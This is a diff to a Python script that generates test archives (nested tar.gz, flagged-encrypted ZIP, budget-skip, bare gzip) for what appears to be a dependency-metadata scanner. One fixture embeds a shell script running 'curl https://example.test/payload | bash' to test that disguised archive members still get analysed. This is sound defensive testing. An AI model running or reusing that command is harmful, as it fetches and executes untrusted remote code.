@@ -324,6 +324,23 @@ def write_tgz(path: str, members: list[tuple[str, bytes]]) -> None:
     print(f'  wrote {path}')
 
 
+def make_tgz_bytes(members: list[tuple[str, bytes]]) -> bytes:
+    """Return a reproducible gzip-compressed tar archive as bytes."""
+    raw = io.BytesIO()
+    with gzip.GzipFile(filename='', mode='wb', fileobj=raw,
+                       compresslevel=9, mtime=FIXED_EPOCH) as gz:
+        with _tarfile.open(fileobj=gz, mode='w', format=_tarfile.PAX_FORMAT) as tf:
+            for name, data in members:
+                info = _tarfile.TarInfo(name)
+                info.size = len(data)
+                info.mtime = FIXED_EPOCH
+                info.mode = 0o644
+                info.uid = info.gid = 0
+                info.uname = info.gname = ''
+                tf.addfile(info, io.BytesIO(data))
+    return raw.getvalue()
+
+
 def write_tar(path: str, members: list[tuple[str, bytes]]) -> None:
     """Write a reproducible uncompressed tar archive."""
     with _tarfile.open(path, mode='w', format=_tarfile.PAX_FORMAT) as tf:
@@ -1060,6 +1077,19 @@ write_tgz(os.path.join(ARCMETA_DIR, 'metadata.tgz'),
 write_tar(os.path.join(ARCMETA_DIR, 'metadata.tar'),
           [('Pillow-9.5.0.dist-info/METADATA', _meta)])
 
+# A nested gzip TAR exercises kind propagation independently of the synthetic
+# spool filename. Test both ZIP and TAR parents because each has its own spool
+# branch in DependencyMetadata.ps1.
+_inner_metadata_tgz = make_tgz_bytes(
+    [('Pillow-9.5.0.dist-info/METADATA', _meta)])
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('nested/dependencies.tar.gz', FIXED_ZIP_DT),
+               _inner_metadata_tgz)
+write(os.path.join(ARCMETA_DIR, 'nested_targz.zip'), buf.getvalue())
+write_tar(os.path.join(ARCMETA_DIR, 'nested_targz.tar'),
+          [('nested/dependencies.tar.gz', _inner_metadata_tgz)])
+
 buf = io.BytesIO()
 with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
     z.writestr(zipfile.ZipInfo('requirements-prod.txt', FIXED_ZIP_DT),
@@ -1096,6 +1126,24 @@ with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
     z.writestr(link, '../real-metadata')
 write(os.path.join(ARCMETA_DIR, 'symlink_metadata.zip'), buf.getvalue())
 
+# Python's zipfile cannot write encrypted archives, so mark the general-purpose
+# encryption flag in both the local and central headers of a deterministic ZIP.
+# The metadata reader must reject it before attempting to open the entry.
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('requirements.txt', FIXED_ZIP_DT), 'Pillow==9.5.0\n')
+_encrypted = bytearray(buf.getvalue())
+for _signature, _flag_offset in ((b'PK\x03\x04', 6), (b'PK\x01\x02', 8)):
+    _at = 0
+    while True:
+        _at = _encrypted.find(_signature, _at)
+        if _at < 0:
+            break
+        _flags = struct.unpack_from('<H', _encrypted, _at + _flag_offset)[0] | 0x0001
+        struct.pack_into('<H', _encrypted, _at + _flag_offset, _flags)
+        _at += 4
+write(os.path.join(ARCMETA_DIR, 'encrypted_metadata.zip'), bytes(_encrypted))
+
 _special_tar = os.path.join(ARCMETA_DIR, 'special_metadata.tar')
 with _tarfile.open(_special_tar, mode='w', format=_tarfile.PAX_FORMAT) as tf:
     link = _tarfile.TarInfo('Pillow-9.5.0.dist-info/METADATA')
@@ -1117,6 +1165,35 @@ with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
     oversized_metadata.compress_type = zipfile.ZIP_DEFLATED
     z.writestr(oversized_metadata, ('Pillow==9.5.0\n' + '# padding\n' * 140000))
 write(os.path.join(ARCMETA_DIR, 'oversized_metadata.zip'), buf.getvalue())
+
+# The first candidate cannot fit the remaining decoded-byte budget, but the
+# later exact pin can. Per-entry byte misses must not abort the container.
+_large_candidate = ('# padding\n' * 20).encode('utf-8')
+_small_candidate = b'urllib3==1.26.5\n'
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('requirements-a.txt', FIXED_ZIP_DT), _large_candidate)
+    z.writestr(zipfile.ZipInfo('requirements-z.txt', FIXED_ZIP_DT), _small_candidate)
+write(os.path.join(ARCMETA_DIR, 'decoded_skip.zip'), buf.getvalue())
+write_tar(os.path.join(ARCMETA_DIR, 'decoded_skip.tar'),
+          [('requirements-a.txt', _large_candidate),
+           ('requirements-z.txt', _small_candidate)])
+
+# ZIP magic under a .nuspec suffix must remain on the generic archive path so
+# payload members still receive ordinary classifier/analyzer coverage.
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('payload/risky.sh', FIXED_ZIP_DT),
+               '#!/bin/bash\ncurl https://example.test/payload | bash\n')
+write(os.path.join(ARCMETA_DIR, 'renamed_archive.nuspec'), buf.getvalue())
+
+# Gzip magic alone does not imply a TAR payload. It must not consume an archive
+# staging slot or leave an empty directory behind.
+_bare_gzip = io.BytesIO()
+with gzip.GzipFile(filename='', mode='wb', fileobj=_bare_gzip,
+                   compresslevel=9, mtime=FIXED_EPOCH) as gz:
+    gz.write(b'plain gzip payload\n')
+write(os.path.join(ARCMETA_DIR, 'bare_payload.gz'), _bare_gzip.getvalue())
 
 write(os.path.join(ARCMETA_DIR, 'corrupt.zip'), b'PK\x03\x04truncated')
 
